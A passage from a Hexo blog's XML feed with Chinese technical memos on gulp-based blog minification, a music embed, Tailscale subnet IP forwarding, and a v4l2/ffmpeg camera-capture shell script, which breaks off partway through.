s<br>[05:53:40] gulp-imagemin: Minified 7 images (saved 1.72 MB - 41.1%)<br>[05:53:40] Finished <span class="hljs-string">&#x27;minify-images&#x27;</span> after 2.63 min<br>[05:53:40] Finished <span class="hljs-string">&#x27;default&#x27;</span> after 2.63 min<br></code></pre></td></tr></table></figure><p>需要注意我将gulpfile文件后缀改为了”.mjs”，理论上这样会使hexo以es6语法读取这个文件</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/imagemin/imagemin/issues/380">https://github.com/imagemin/imagemin/issues/380</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://es6.ruanyifeng.com/#docs/module">https://es6.ruanyifeng.com/#docs/module</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Free Bird</title>
    <link href="/blog/music-embed/"/>
    <url>/blog/music-embed/</url>
    
    <content type="html"><![CDATA[<div id="music_div" class="music"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=5049666&auto=1&height=66"></iframe></div><style>    .music{margin: auto;width: 50%;z-index:4;bottom:0;left:30px}    @media screen and (max-width:768px){        .music{display:none}    }</style><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;music_div&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;music&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">marginwidth</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">marginheight</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">330</span> <span class="hljs-attr">height</span>=<span class="hljs-string">86</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//music.163.com/outchain/player?type=2&amp;id=5049666&amp;auto=1&amp;height=66&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-selector-class">.music</span>&#123;<span class="hljs-attribute">margin</span>: auto;<span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<span class="hljs-attribute">z-index</span>:<span class="hljs-number">4</span>;<span class="hljs-attribute">bottom</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">left</span>:<span class="hljs-number">30px</span>&#125;</span><br><span class="css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>:<span class="hljs-number">768px</span>)&#123;</span><br><span class="css"><span class="hljs-selector-class">.music</span>&#123;<span class="hljs-attribute">display</span>:none&#125;</span><br><span class="css">&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tailscale-linux-子网配置</title>
    <link href="/tailscale-subnet-linux/"/>
    <url>/tailscale-subnet-linux/</url>
    
    <content type="html"><![CDATA[<p>tailscale在linux下组网需要配置，不像win一样Plug and play。这也是linux的乐趣，只有真正热爱且有时间的人会得到奖励。</p><span id="more"></span><p>之前一直没找到方法，今天才找到官方文档中的相关部分。<br>先看链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">https://tailscale.com/kb/1019/subnets/#enable-ip-forwarding<br>https://tailscale.com/kb/1023/troubleshooting/#why-do-i-get-an-error-about-ip-forwarding-when-using-advertise-routes<br></code></pre></td></tr></table></figure><h2 id="Enable-IP-forwarding"><a href="#Enable-IP-forwarding" class="headerlink" title="Enable IP forwarding"></a>Enable IP forwarding</h2><p>If your Linux system has a /etc/sysctl.d directory, use:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;net.ipv4.ip_forward = 1&#x27;</span> | sudo tee -a /etc/sysctl.d/99-tailscale.conf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;net.ipv6.conf.all.forwarding = 1&#x27;</span> | sudo tee -a /etc/sysctl.d/99-tailscale.conf<br>sudo sysctl -p /etc/sysctl.d/99-tailscale.conf<br></code></pre></td></tr></table></figure><p>Otherwise, use:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;net.ipv4.ip_forward = 1&#x27;</span> | sudo tee -a /etc/sysctl.conf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;net.ipv6.conf.all.forwarding = 1&#x27;</span> | sudo tee -a /etc/sysctl.conf<br>sudo sysctl -p /etc/sysctl.conf<br></code></pre></td></tr></table></figure><p>If your Linux node uses firewalld, you may need to also allow masquerading due to a known issue. As a workaround, you can allow masquerading with this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">firewall-cmd --permanent --add-masquerade<br></code></pre></td></tr></table></figure><p>Other distros may require different steps.</p><p>When enabling IP forwarding, ensure your firewall is set up to deny traffic forwarding by default. This is a default setting for common firewalls like <code>ufw</code> and <code>firewalld</code>, and ensures your device doesn’t route traffic you don’t intend.</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo minifier gulp 压缩博客</title>
    <link href="/blog/hexo-minifier/"/>
    <url>/blog/hexo-minifier/</url>
    
    <content type="html"><![CDATA[<p>关键词：hexo-all-minifier gulp 插件<br>之后研究：<a href="blog/es6-js-gulp.md">es6-js-gulp</a></p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">https://summerandwinter.github.io/hexo-minify-two.html<br>https://ehlxr.me/2016/08/30/使用Hexo基于GitHub-Pages搭建个人博客（三）/<br></code></pre></td></tr></table></figure><p>安装后时间变成了UTC，我一不小心用之前的存档覆盖了博客一堆内容，欲哭无泪，但时间问题还没解决</p><p>后来再次尝试进行博客压缩，找到gulp，有一位前辈的研究很独特，在此放个链接：</p><blockquote><p><a href="https://blog.inkuang.com/2021/405/">https://blog.inkuang.com/2021/405/</a></p></blockquote><p>为了防止丢失，我从以上文章中总结了一些内容：</p><h1 id="其他教程存在的问题"><a href="#其他教程存在的问题" class="headerlink" title="其他教程存在的问题"></a>其他教程存在的问题</h1><p>使用关键词 hexo gulp 在网上搜索，可以搜到一堆类似的教程，但是根据我的实际测试，网上搜到的这些教程大部分都已经过时了，现在再使用的话或多或少的存在一些问题。</p><p>这些教程中一般都是通过安装 gulp-minify-css、gulp-uglify、gulp-htmlclean、gulp-htmlmin 这几个插件来处理的。下面按照压缩任务划分，分别说明一下现在还按照这些教程操作的话存在的一些问题。<br>gulp-minify-css 这个插件已弃用，请使用 gulp-clean-css 。这虽然并不影响我们的正常使用该插件，但是有更好的替代品的话为什么还要用这个已弃用的插件呢？<br>gulp-uglify 不兼容ES6</p><p>上面提到的插件中 gulp-htmlclean 和 gulp-htmlmin 是用来压缩 HTML 代码的。</p><p>网上教程的一般做法是先将代码传递给 gulp-htmlclean 清理掉其中的空白，然后再传递给 gulp-htmlmin 来移除注释、压缩 HTML 文件中的 CSS、JS 代码等。然而查看 gulp-htmlmin 所基于的 html-minifier 的文档发现，它有一个 collapseWhitespace 参数，设置为 true 时可以移除 HTML 代码中的空白块，那还多此一举的安装一个 gulp-htmlclean 插件干什么呢？</p><p>另外，上面提到了 gulp-htmlmin 可以压缩 HTML 中的 JS 代码，这个功能用的是跟 gulp-uglify 一样的底层库 uglify-js 来实现的，这也就导致它同样的不兼容 ES6 标准。最终会发现 HTML 文件中的内容并没有被全部压缩成“一行”，仍有部分 JS 代码是以未被压缩的形式存在的。</p><h1 id="操作方法及任务配置"><a href="#操作方法及任务配置" class="headerlink" title="操作方法及任务配置"></a>操作方法及任务配置</h1><p>根据 gulp 及各个插件的文档，我们首先需要全局安装 gulp-cli，然后在博客工作目录下安装需要的插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --global gulp-cli<br>npm install gulp gulp-clean-css gulp-uglify-es gulp-html-minifier-terser<br></code></pre></td></tr></table></figure><p>安装完成后在博客工作目录下新建文件 gulpfile.js ，写入如下 gulp 任务配置代码（详细描述见注释）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> gulp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gulp&#x27;</span>);<br><span class="hljs-keyword">const</span> cleancss = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gulp-clean-css&#x27;</span>);<br><span class="hljs-keyword">const</span> uglify = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gulp-uglify-es&#x27;</span>).default;<br><span class="hljs-keyword">const</span> htmlmin = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gulp-html-minifier-terser&#x27;</span>);<br><br><br><span class="hljs-comment">// 压缩public目录下的css文件</span><br><span class="hljs-comment">// 可接受参数的文档：https://github.com/jakubpawlowicz/clean-css#constructor-options</span><br>gulp.task(<span class="hljs-string">&#x27;minify-css&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> gulp.src(<span class="hljs-string">&#x27;./public/**/*.css&#x27;</span>)           <span class="hljs-comment">// 处理public目录下所有的css文件，下同</span><br>        .pipe(cleancss(&#123; <span class="hljs-attr">compatibility</span>: <span class="hljs-string">&#x27;ie8&#x27;</span> &#125;))  <span class="hljs-comment">// 兼容到IE8</span><br>        .pipe(gulp.dest(<span class="hljs-string">&#x27;./public&#x27;</span>));<br>&#125;);<br><br><span class="hljs-comment">// 压缩public目录下的js文件</span><br>gulp.task(<span class="hljs-string">&#x27;minify-js&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> gulp.src(<span class="hljs-string">&#x27;./public/**/*.js&#x27;</span>)<br>        .pipe(uglify())<br>        .pipe(gulp.dest(<span class="hljs-string">&#x27;./public&#x27;</span>));<br>&#125;);<br><br><span class="hljs-comment">// 压缩public目录下的html文件</span><br><span class="hljs-comment">// 可接受参数的文档：https://github.com/terser/html-minifier-terser#options-quick-reference</span><br>gulp.task(<span class="hljs-string">&#x27;minify-html&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> gulp.src(<span class="hljs-string">&#x27;./public/**/*.html&#x27;</span>)<br>        .pipe(htmlmin(&#123;<br>            <span class="hljs-attr">removeComments</span>: <span class="hljs-literal">true</span>,                 <span class="hljs-comment">// 移除注释</span><br>            <span class="hljs-attr">removeEmptyAttributes</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// 移除值为空的参数</span><br>            <span class="hljs-attr">removeRedundantAttributes</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 移除值跟默认值匹配的属性</span><br>            <span class="hljs-attr">collapseBooleanAttributes</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 省略布尔属性的值</span><br>            <span class="hljs-attr">collapseWhitespace</span>: <span class="hljs-literal">true</span>,             <span class="hljs-comment">// 移除空格和空行</span><br>            <span class="hljs-attr">minifyCSS</span>: <span class="hljs-literal">true</span>,                      <span class="hljs-comment">// 压缩HTML中的CSS</span><br>            <span class="hljs-attr">minifyJS</span>: <span class="hljs-literal">true</span>,                       <span class="hljs-comment">// 压缩HTML中的JS</span><br>            <span class="hljs-attr">minifyURLs</span>: <span class="hljs-literal">true</span>                      <span class="hljs-comment">// 压缩HTML中的链接</span><br>        &#125;))<br>        .pipe(gulp.dest(<span class="hljs-string">&#x27;./public&#x27;</span>))<br>&#125;);<br><br><span class="hljs-comment">// 默认任务，不带任务名运行gulp时执行的任务</span><br>gulp.task(<span class="hljs-string">&#x27;default&#x27;</span>, gulp.parallel(<br>    <span class="hljs-string">&#x27;minify-css&#x27;</span>, <span class="hljs-string">&#x27;minify-js&#x27;</span>, <span class="hljs-string">&#x27;minify-html&#x27;</span><br>));<br></code></pre></td></tr></table></figure><p>保存之后先用 hexo g 生成博客文件，然后执行命令 gulp 就可以对刚刚生成的博客文件（public 目录下的文件）进行压缩优化处理了。</p><h1 id="以上文章来自：https-blog-inkuang-com-2021-405"><a href="#以上文章来自：https-blog-inkuang-com-2021-405" class="headerlink" title="以上文章来自：https://blog.inkuang.com/2021/405/"></a>以上文章来自：<a href="https://blog.inkuang.com/2021/405/">https://blog.inkuang.com/2021/405/</a></h1>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下调用摄像头拍照-v4l2与ffmpeg</title>
    <link href="/v4l2-theLinuxVideoSolution/"/>
    <url>/v4l2-theLinuxVideoSolution/</url>
    
    <content type="html"><![CDATA[<h1 id="我的实际操作记录"><a href="#我的实际操作记录" class="headerlink" title="我的实际操作记录"></a>我的实际操作记录</h1><h2 id="v4l2获取图像部分"><a href="#v4l2获取图像部分" class="headerlink" title="v4l2获取图像部分"></a>v4l2获取图像部分</h2><p>找到了这位大佬的博客<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://zhaoxuhui.top/blog/2021/09/23/v4l2-introduction-and-usb-camera-bayer-raw-data.html">[6]</span></a></sup>，是本文学习的基础。具体操作总结如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">v4l2-ctl --list-devices <span class="hljs-comment">#显示当前连接的摄像头设备（必须）</span><br>v4l2-ctl -d /dev/video0 <span class="hljs-comment">#连接到一个设备（必须）</span><br>v4l2-ctl -D <span class="hljs-comment">#输出设备的驱动信息</span><br>v4l2-ctl -L <span class="hljs-comment">#输出当前设备支持的控制选项</span><br>v4l2-ctl --list-formats-ext <span class="hljs-comment">#注意⚠️返回值写着摄像头支持的所有输出模式，如YUYV（必须）</span><br>v4l2-ctl --verbose --set-fmt-video=width=640,height=480,pixelformat=YUYV --stream-mmap --stream-count=1 --stream-to=test.yuv <span class="hljs-comment">#在当前位置生成图片，注意pixelformat报错时回到5️⃣（必须）</span><br></code></pre></td></tr></table></figure><p>但我在第6️⃣步时没能成功输出能看的图片，于是下载了obs试试可行性，确认可行。obs作为开源软件可以方便的查看它的原代码。下附部分obs返回的调试消息<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote">&lt;span class=”hint–top hint–rounded” aria-label=”<pre><span class="line">1</span><br><span class="line">2</span><br></pre><pre><code class="hljs bash">ffmpeg -s 640x480 -i test.yuv aa.jpeg  <span class="hljs-comment">#(错误代码)</span><br>ffmpeg -y -s:v 640x480 -pix_fmt yuyv422 -i test.yuv result.jpg  <span class="hljs-comment">#(正确代码)</span><br></code></pre>“&gt;[5]</span></a></sup>。</p><ol><li>通过在开源代码里寻找，找到了疑似实现功能的代码片段<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/obsproject/obs-studio/blob/c5015d0e6cb180d138e1a9e2258afd903254b9ea/plugins/linux-v4l2/v4l2-input.c">[1]</span></a></sup>。但是我看不懂😵‍💫，于是搜寻其他信息</li><li>我虽然知道YUV和RGB不同，却不知道还有.yuv这种格式，6️⃣步所得的结果并不能以.jpg方式打开/.yuv格式打开结果不正常，因此需要进行转换。我使用网上找到的命令(下代码块第一行)，打开能看到大概外形但是像素位置错乱。估计因为没有选择正确的”-pix_fmt”</li><li>通过指定原-pix_fmt获得了正确结果(下代码块第二行)<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://stackoverflow.com/questions/70961566/how-to-convert-raw-yuv-image-to-jpg">[2]</span></a></sup><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir /dev/shm/user.camcap_cache <span class="hljs-comment">#创建内存盘</span><br>ln -s /dev/shm/user.camcap_cache ./cache <span class="hljs-comment">#在当前目录下创建软链接方便使用</span><br></code></pre></td></tr></table></figure></li></ol><p>还有一段命令也是我找到的，但我没试过可行性同时也忘了记录来源:</p><blockquote><p>ffmpeg -s 640x480 -i bbb.yuv -ss 00:00:00 -c:v libx264 -s:v 640x480 -preset slow -t 00:08:20 output.mp4</p></blockquote><h2 id="创建内存盘部分"><a href="#创建内存盘部分" class="headerlink" title="创建内存盘部分"></a>创建内存盘部分</h2><h3 id="信息挖掘"><a href="#信息挖掘" class="headerlink" title="信息挖掘"></a>信息挖掘</h3><p>随后上网寻找创建内存盘的方法，参考了如下几个网站的内容</p><blockquote><ol><li><a href="https://zhuanlan.zhihu.com/p/67170890">https://zhuanlan.zhihu.com/p/67170890</a></li><li><a href="https://www.linuxdashen.com/%E4%B8%BA%E4%BD%A0%E7%9A%84linux%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BAram-disk">https://www.linuxdashen.com/%E4%B8%BA%E4%BD%A0%E7%9A%84linux%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BAram-disk</a></li><li><a href="https://cloud.tencent.com/developer/article/1767470">https://cloud.tencent.com/developer/article/1767470</a></li></ol></blockquote><h3 id="实际执行-3-4"><a href="#实际执行-3-4" class="headerlink" title="实际执行[3][4]"></a>实际执行<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://unix.stackexchange.com/questions/26364/how-can-i-create-a-tmpfs-as-a-regular-non-root-user">[3]</span></a></sup><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://superuser.com/questions/389500/how-can-i-mount-a-tmpfs-without-root">[4]</span></a></sup></h3><p>创建内存盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<span class="hljs-comment">#移植时无需移植</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a = os.popen(<span class="hljs-string">&#x27;./capcam.sh&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#移植时无需移植</span><br>    <span class="hljs-comment">#print(a.read())</span><br></code></pre></td></tr></table></figure><h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><p>然后我写了个shell脚本，越写越上头，不负责任的说这是我写过最美的代码。<br>需要安装v4l2和ffmpeg，其他什么都不要，奏似这么轻量。<br>扩展阅读</p><blockquote><p><a href="https://chtseng.wordpress.com/2022/07/18/%E4%BD%BF%E7%94%A8v4l2-ctl%E8%AA%BF%E6%95%B4-usb-camera%E5%8F%83%E6%95%B8/">https://chtseng.wordpress.com/2022/07/18/使用v4l2-ctl調整-usb-camera參數/</a><br><a href="http://zhaoxuhui.top/blog/2021/09/23/v4l2-introduction-and-usb-camera-bayer-raw-data.html">http://zhaoxuhui.top/blog/2021/09/23/v4l2-introduction-and-usb-camera-bayer-raw-data.html</a><br><a href="https://silencewt.github.io/2015/04/29/v4l2%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE%E5%92%8C%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90/">https://silencewt.github.io/2015/04/29/v4l2的学习建议和流程解析/</a></p></blockquote><h2 id="脚本及执行方法"><a href="#脚本及执行方法" class="headerlink" title="脚本及执行方法"></a>脚本及执行方法</h2><p>例:复制到capcam.sh中</p><ol><li>chmod +x capcam.sh</li><li>执行./capcam.sh</li><li>结束</li><li>另外，./capcam.sh clean清理目录，./capcam.sh mod手动定义捕获参数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment">#补充 文件使用：./[文件名].sh clean，如./v4l2test.sh clean 清理文件；./v4l2test.sh mod 修改volatile变量</span><br>ROM_CAPTURE_PATH=<span class="hljs-string">&quot;./rom_camcache&quot;</span><span class="hljs-comment">#数据暂存路径，SELECT_CACHE_LOC值选择实际数据存放的位置</span><br>SELECT_CACHE_LOC=0<span class="hljs-comment">#可选值0 or 1，0:选择内存盘；1:选择ROM_CAPTURE_PATH指定地址</span><br>RAM_DIR_NAME=<span class="hljs-string">&quot;user.camcap_cache&quot;</span><span class="hljs-comment">#RAM临时文件文件名</span><br>IS_HARDCODE=1<span class="hljs-comment">#值为1时使用程序中硬编码的摄像头捕获参数</span><br><span class="hljs-comment">###Volatile parameter</span><br>DEVICE_LOC=2<br>CAP_WIDTH=2560<br>CAP_HEIGHT=720<br>CAP_PIXFMT=MJPG<br>CAP_SUFFIX=jpeg <span class="hljs-comment">#jpeg/raw depends on CAP_PIXFMT is MJPEG/YUYV etc.此处需要修改！！我后来发现如果是仅YUYV的摄像头而这里还是jpeg就会报错没有找到raw文件</span><br><span class="hljs-comment">###</span><br>PIX_FMT_FFMPEG=<span class="hljs-string">&quot;yuyv422&quot;</span> <span class="hljs-comment">#ffmpeg需要原像素格式的信息，我的设备只有这一种，所以我的代码就不对其他格式适配了。</span><br><span class="hljs-comment">#摄像头初始化处也需要制定像素格式，但是参数拼写不一样，需要进一步完善代码可以从这里做起。</span><br>start=`date +%s.%N`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\nROM_CAPTURE_PATH=<span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span>\t#数据暂存路径，SELECT_CACHE_LOC值选择实际数据存放的位置\nSELECT_CACHE_LOC=<span class="hljs-variable">$&#123;SELECT_CACHE_LOC&#125;</span>\t#可选值0 or 1，0:选择内存盘；1:选择ROM_CAPTURE_PATH指定地址\nRAM_DIR_NAME=<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>\t\t#RAM临时文件文件名\nIS_HARDCODE=<span class="hljs-variable">$&#123;IS_HARDCODE&#125;</span>\t\t#值为1时使用程序中硬编码的摄像头捕获参数\n###Volatile parameter###\nDEVICE_LOC=<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span>\nCAP_WIDTH=<span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>\nCAP_HEIGHT=<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span>\nCAP_PIXFMT=<span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span>\n###\nPIX_FMT_FFMPEG=<span class="hljs-variable">$&#123;PIX_FMT_FFMPEG&#125;</span>&quot;</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;clean&quot;</span> ]<br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cleaning the dir in RAM:&quot;</span><br>rm -ir /dev/shm/<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cleaning the link to the dir in RAM:&quot;</span><br>rm <span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cleaning the dir in ROM:&quot;</span><br>rm -ir <span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Process Done.&quot;</span><br><span class="hljs-built_in">return</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;mod&quot;</span> ]<br><span class="hljs-keyword">then</span><br>IS_HARDCODE=0<br><span 